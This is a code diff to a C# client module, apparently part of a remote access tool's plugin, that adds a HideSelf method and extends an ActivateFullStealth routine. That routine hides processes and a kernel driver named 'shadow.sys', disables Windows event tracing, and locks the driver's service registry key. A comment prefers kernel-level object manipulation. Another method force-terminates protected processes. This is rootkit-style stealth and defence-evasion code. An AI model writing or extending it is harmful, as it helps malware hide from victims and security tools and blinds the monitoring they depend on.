@@ -68,6 +68,14 @@ namespace Pulsar.Plugins.Client.Modules
         }
 
         /// <summary>
+        /// Hide the current process calling this wrapper
+        /// </summary>
+        public bool HideSelf()
+        {
+            return HideProcess(System.Diagnostics.Process.GetCurrentProcess().Id);
+        }
+
+        /// <summary>
         /// Force terminate any process (even protected)
         /// </summary>
         public bool TerminateProcess(int pid)
@@ -437,9 +445,14 @@ namespace Pulsar.Plugins.Client.Modules
         public bool ActivateFullStealth(int pid)
         {
             bool success = true;
+            // Always prioritize kernel-level DKOM over fragile user-mode hooks
             success &= HideProcess(pid);
             success &= HideDriver("shadow.sys");
             success &= DisableEtw();
+            
+            // Protect current configuration in registry
+            success &= ProtectRegistryKey("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\shadow", true);
+            
             return success;
         }
 
